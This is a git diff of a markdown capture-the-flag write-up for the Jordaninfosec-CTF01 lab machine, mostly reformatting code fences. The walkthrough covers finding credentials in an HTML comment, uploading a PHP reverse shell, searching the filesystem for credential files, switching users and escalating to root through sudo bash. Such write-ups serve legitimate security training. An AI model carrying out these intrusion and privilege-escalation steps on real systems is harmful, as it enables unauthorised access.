@@ -1,20 +1,19 @@
 ---
+title: Jordan Infosec CTF01
 categories: [Proving Grounds Play]
-tags: [PrivEsc]
+tags: [File Upload, PrivEsc]
+image:
+  path: https://miro.medium.com/v2/resize:fit:1200/1*WwEcNu2bHpKt_WpejYTupQ.png
+  alt:  Jordaninfosec-CTF01 Machine 🖥️
 ---
 
-Let’s check the IP address of the victim machine →
+
+### Let’s check the IP address of the victim machine →
 
 ![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled.png)
 
 ```bash
 IP : 10.0.2.46 
-```
-
-## Port Scan Results ⤵️
-
-```bash
-
 ```
 
 ## Web Enumeration ⤵️
@@ -29,7 +28,7 @@ hint.txt —>
 
 ![Untitled](/Vulnhub-Files/img/Jordaninfosec-CTF01/Untitled%204.png)
 
-```jsx
+```bash
 <!--	username : admin
 	password : 3v1l_H@ck3r
 	The 2nd flag is : {7412574125871236547895214}
@@ -46,7 +45,7 @@ and now upload the reverse shell file here —>
 
 As ⬆️ I got success in uploading the files so lets load that shell file ➡️
 
-```jsx
+```bash
 URL --> http://10.0.2.46/uploaded_files/shell.php
 ```
 
@@ -56,7 +55,7 @@ In response to that I got this —>
 
 Actually, this statement of hidden file was a little misleading, because the file we are looking for was not hidden… I tried to search for user, pass, etc… files, but unfortunately, none of them worked. Lastly, I tried `find / -name cred*`, which revealed the /etc/mysql/conf.d/credentials.txt file.
 
-```jsx
+```bash
 www-data@Jordaninfosec-CTF01:/$ find / -name cred* 2>/dev/null
 /sys/kernel/slab/cred_jar
 /usr/share/man/man7/credentials.7.gz
@@ -77,7 +76,7 @@ www-data@Jordaninfosec-CTF01:/$
 
 Now thank god I got the credentials I was pissed so bad —>
 
-```jsx
+```bash
 www-data@Jordaninfosec-CTF01:/$ su technawi
 su technawi
 Password: 3vilH@ksor
@@ -90,7 +89,7 @@ technawi@Jordaninfosec-CTF01:/$
 
 Now lets see how technawi can lead me to root —>
 
-```jsx
+```bash
 technawi@Jordaninfosec-CTF01:/$ sudo -l
 sudo -l
 [sudo] password for technawi: 3vilH@ksor
@@ -106,7 +105,7 @@ technawi@Jordaninfosec-CTF01:/$
 
 Now its root time ➡️
 
-```jsx
+```bash
 technawi@Jordaninfosec-CTF01:/$ sudo /bin/bash -i
 sudo /bin/bash -i
 root@Jordaninfosec-CTF01:/# whoami
@@ -117,7 +116,7 @@ root@Jordaninfosec-CTF01:/#
 
 Let’s find out the last flag ➡️
 
-```jsx
+```bash
 root@Jordaninfosec-CTF01:/var/www/html# cat flag.txt
 cat flag.txt
 The 5th flag is : {5473215946785213456975249}
